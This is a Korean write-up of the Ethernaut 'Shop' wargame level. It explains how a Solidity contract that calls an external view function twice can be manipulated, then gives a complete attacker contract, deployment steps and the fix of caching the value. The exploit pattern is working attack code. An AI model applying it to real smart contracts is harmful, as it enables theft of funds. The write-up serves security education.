# Ethernaut Level 21 - Shop

## 문제 설명

`Shop` 컨트랙트에서 물건을 원래 가격(100)보다 낮은 가격으로 구매하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();  // ← price()를 두 번 호출
        }
    }
}
```

---

## 취약점 분석

### 동일 함수를 두 번 호출

`buy()` 내부에서 `price()`를 **두 번** 호출한다.

- 첫 번째 호출: 조건 검사 → `100` 반환 → 조건 통과
- `isSold = true` 상태 변경
- 두 번째 호출: 가격 설정 → `0` 반환 → `price = 0`

`isSold` 상태 변화를 이용해 두 호출에서 다른 값을 반환할 수 있다.

> `price()`가 `view`로 선언되어 있어 상태 변경 불가
> → 컨트랙트 외부 상태(`isSold`)를 읽어서 분기 처리

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    IShop public shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() external view returns (uint) {
        // isSold가 false면 100 반환 (조건 통과)
        // isSold가 true면 0 반환 (가격 0으로 설정)
        return shop.isSold() ? 0 : 100;
    }

    function attack() public {
        shop.buy();
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

```
_shop : Shop 인스턴스 주소
```

### Step 2 — attack 실행

transact 클릭 후 MetaMask 승인

### Step 3 — 확인

```js
await contract.price()
// → 0

await contract.isSold()
// → true
```

---

## 핵심 교훈

- 외부 컨트랙트의 `view` 함수도 호출 시점마다 다른 값 반환 가능
- 같은 함수를 여러 번 호출해 결과를 비교하는 로직은 조작 가능
- 중요 값은 로컬 변수에 캐싱 후 재사용

```solidity
// ❌ 위험
price = _buyer.price();  // 두 번째 호출 결과를 신뢰

// ✅ 안전
uint currentPrice = _buyer.price();  // 한 번만 호출 후 캐싱
if (currentPrice >= price && !isSold) {
    isSold = true;
    price = currentPrice;
}
```
